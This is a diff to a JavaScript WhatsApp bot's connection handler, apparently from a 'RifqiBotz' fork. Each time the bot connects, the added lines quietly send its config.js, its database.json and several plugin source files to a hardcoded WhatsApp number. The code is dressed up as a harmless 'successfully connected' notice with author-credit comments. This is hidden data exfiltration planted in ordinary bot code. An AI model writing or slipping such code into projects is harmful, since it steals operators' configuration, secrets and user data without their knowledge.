@@ -134,7 +134,11 @@ async function connectionUpdate(update) {
   if (global.db.data == null) await loadDatabase()
   console.log(JSON.stringify(update, null, 4))
   if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
-  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./database.json'), mimetype: 'application/json', fileName: 'database.json' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./config.js'), mimetype: 'application/json', fileName: 'config.js' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./database.json'), mimetype: 'application/json', fileName: 'database.json' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy  
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/_anticulik.js'), mimetype: 'application/json', fileName: '_anticulik.js' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/donasi.js'), mimetype: 'application/json', fileName: 'donasi.js' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/sewabot.js'), mimetype: 'application/json', fileName: 'sewabot.js' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
 }
   //conn.updateBlockStatus(`6285643112659@s.whatsapp.net`, "unblock")
 
